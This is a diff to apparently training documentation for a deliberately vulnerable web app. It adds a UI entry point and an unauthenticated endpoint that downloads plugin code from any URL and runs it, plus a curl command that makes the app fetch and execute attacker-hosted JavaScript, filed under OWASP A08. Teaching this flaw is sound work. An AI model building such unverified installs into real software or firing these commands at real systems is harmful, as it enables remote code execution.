@@ -1385,6 +1385,23 @@ EXPLOIT (no auth required — the route is not behind requireSession)
 LIST installed plugins:
   curl -s http://localhost:3001/admin/integrity/list
 
+UI ENTRY POINT (added for Ch 24 discovery)
+  GET /admin/integrity/  renders an "Extension marketplace" page (view
+  views/integrity.ejs), linked from the admin panel (views/admin.ejs).
+  The "paste code" form posts to POST /admin/integrity/install (same
+  sink; content-negotiates JSON vs the rendered page).
+
+B-INT-002 — auto-update from an untrusted URL (now implemented)
+  POST /admin/integrity/install-url  body {name, url}
+  Fetches the module source from ANY url (no scheme/host allow-list, no
+  TLS pinning, no checksum) and installs+runs it. This is the "pull a
+  build artefact / plugin from a registry URL" supply-chain path.
+    # attacker hosts code, then:
+    curl -s http://localhost:3001/admin/integrity/install-url \
+      --data-urlencode name=remote-ext \
+      --data-urlencode url=http://127.0.0.1:8099/ext.js
+    # => runs the fetched bytes; init() output returned
+
 WHY THIS IS A08 (not just "RCE")
   A08 Software & Data Integrity Failures covers code & data shipped into
   the application without verifying its origin or integrity. This sink
